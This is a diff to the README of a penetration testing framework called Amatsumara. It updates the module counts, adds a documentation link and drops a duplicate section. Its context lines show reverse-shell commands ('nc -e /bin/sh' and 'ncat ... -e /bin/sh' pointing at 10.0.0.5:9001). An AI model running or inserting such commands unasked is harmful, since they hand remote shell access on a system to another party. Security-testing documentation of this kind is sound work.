@@ -20,10 +20,12 @@ Amatsumara is a penetration testing framework built for performance and safety. 
 
 | | Count |
 |---|---|
-| Exploit Modules | 6 |
-| Auxiliary Modules | 17 |
+| Exploit Modules | 7 |
+| Auxiliary Modules | 18 |
 | Post-Exploitation Modules | 2 |
 | Payload Generators | 9 |
+
+> **[Module Documentation](docs/MODULES.md)** — detailed options, usage examples, caveats, and references for every exploit and auxiliary module.
 
 ### Features
 
@@ -171,12 +173,6 @@ nc -e /bin/sh 10.0.0.5 9001
 === Option 3: ncat (nmap netcat) ===
 ncat 10.0.0.5 9001 -e /bin/sh
 ```
-
----
-
-## Modules
-
-For detailed module documentation, see [docs/MODULES.md](docs/MODULES.md).
 
 ---
 
